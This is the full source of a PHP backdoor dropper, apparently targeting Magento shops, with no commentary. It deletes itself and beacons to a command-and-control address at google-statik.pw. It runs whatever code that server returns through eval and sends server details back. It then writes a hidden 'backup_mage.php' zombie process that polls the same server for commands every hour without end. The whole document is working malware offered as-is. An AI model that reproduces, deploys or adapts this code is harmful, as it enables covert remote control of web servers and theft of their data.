WORK
<?php

header("Content-type:text/plain");

set_time_limit(0);

@unlink(__FILE__);
define("BACK_URL", "http://google-statik.pw/analiticsnew/in.php");
//define("BACK_URL", "http://localhost/lag/in.php");
define("ZOMBI_NAME", "backup_mage.php");

function phpPath() {
    if (defined("PHP___PATH"))
        return PHP___PATH;

    $data = ex("php -v 2>&1");
    if (substr_count($data, "PHP")) {
        define("PHP___PATH", "php");
        return "php";
    }

    $data = substr_count(__FILE__, ":") ? ex("where /r ..\\..\\..\\..\\..\\..\\ php.exe") : ex("find / -name php -type f");
    $dd = explode("\n", $data);
    foreach ($dd as $php) {
        $php = trim($php);
        $data = ex("$php -v 2>&1");
        if (substr_count($data, "PHP")) {
            define("PHP___PATH", "$php");
            return "$php";
        }
    }
}

function ex($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $lol = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $lol = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $lol = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $lol = "";
        while (!@feof($f))
            $lol .= fread($f, 1024);
        pclose($f);
    } else
        return "Unable to execute command\n";
    return ($lol == '' ? "Query did not return anything\n" : $lol);
}

function getCurl($url, $post) {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "",
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20120101 Firefox/32.0",
        CURLOPT_AUTOREFERER => true,
        CURLOPT_CONNECTTIMEOUT => 120,
        CURLOPT_TIMEOUT => 120,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    );

    if ($post) {
        $options[CURLOPT_POST] = 1;
        $options[CURLOPT_POSTFIELDS] = $post;
    }



    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $content = curl_exec($ch);
    return $content;
}

if (!substr_count(__FILE__, ":")) {
    $ps = ex('ps -eaf 2>&1');
    $ps_a = explode("\n", $ps);
    foreach ($ps_a as $p) {
        $p = preg_replace('!\s+!', ' ', trim($p));
        $a = explode(" ", $p);
        $pid = sizeof($a) > 2 ? intval($a[1]) : 0;
        if (!$pid)
            continue;
        if (substr_count($p, ZOMBI_NAME)) {
            exit;
        }
    }
}

$data = <<<'HTML'
<?php

set_time_limit(0);

$SERV = unserialize(base64_decode(SERV64));

define("BACK_URL", "___BACK_URL___");
define("DELAY", 3600);

@unlink(__FILE__);

function ex($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $lol = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $lol = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $lol = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $lol = "";
        while (!@feof($f))
            $lol .= fread($f, 1024);
        pclose($f);
    } else
        return "Unable to execute command\n";
    return ($lol == '' ? "Query did not return anything\n" : $lol);
}

function phpPath() {
    if (defined("PHP___PATH"))
        return PHP___PATH;

    $data = ex("php -v 2>&1");
    if (substr_count($data, "PHP")) {
        define("PHP___PATH", "php");
        return "php";
    }

    $data = substr_count(__FILE__, ":") ? ex("where /r ..\\..\\..\\..\\..\\..\\ php.exe") : ex("find / -name php -type f");
    $dd = explode("\n", $data);
    foreach ($dd as $php) {
        $php = trim($php);
        $data = ex("$php -v 2>&1");
        if (substr_count($data, "PHP")) {
            define("PHP___PATH", "$php");
            return "$php";
        }
    }
}


function getCurl($url, $post) {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "",
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20120101 Firefox/32.0",
        CURLOPT_AUTOREFERER => true,
        CURLOPT_CONNECTTIMEOUT => 120,
        CURLOPT_TIMEOUT => 120,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    );

    if ($post) {
        $options[CURLOPT_POST] = 1;
        $options[CURLOPT_POSTFIELDS] = $post;
    }



    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $content = curl_exec($ch);
    return $content;
}

while (true) {
    $url = BACK_URL . "?act=getcmd";
    $url .= "&host=" . urlencode(base64_encode($SERV['HTTP_HOST'] . $SERV['REQUEST_URI']));

    if (defined("SCRIPT_ID")) {
        $url .= "&script_id=" . SCRIPT_ID;
    }

    $data = @getCurl($url, false);
    if ($data) {
        if (!defined("SCRIPT_ID")) {
            $script_id = intval(trim($data));
            if ($script_id)
                define("SCRIPT_ID", $script_id);
            sleep(120);
            continue;
        }

        @eval($data);
        if (isset($r)) {
            $url = BACK_URL . "?act=resultcmd&script_id=" . SCRIPT_ID;
            @getCurl($url, "r=" . urlencode($r));
            unset($r);
        }
    }

    sleep(DELAY);
}
?>        
HTML;

$url = BACK_URL . "?act=onecmd";
$url .= "&host=" . urlencode(base64_encode($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
$d = @getCurl($url, false);
@eval($d);

if (isset($r)) {
    $url = BACK_URL . "?act=resultcmd&host=" . urlencode(base64_encode($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
    @getCurl($url, "r=" . urlencode($r));
    unset($r);
}

$dat = serialize($_SERVER);
$dat = base64_encode($dat);

$data = str_replace("___BACK_URL___", BACK_URL, $data);
$data = "<?php define('SERV64','$dat');?> $data";

$php = phpPath();
if (!$php)
    exit;

$dh = opendir(".");
while ($r = readdir($dh)) {
    if ((!is_dir($r)) || ($r == '..') || ($r == 'nbproject') || (!is_writable($r)))
        continue;

    file_put_contents("$r/" . ZOMBI_NAME, $data);

    if (substr_count(__FILE__, ":")) {
        ex("start /B $php $r/" . ZOMBI_NAME . " &");
    } else {
        ex("nohup $php $r/" . ZOMBI_NAME . " 1>/dev/null 2>&1 &");
    }

    sleep(5);

    if (file_exists("$r/" . ZOMBI_NAME))
        @unlink("$r/" . ZOMBI_NAME);

    exit;
}
unlink('../maintenance.flag');
?>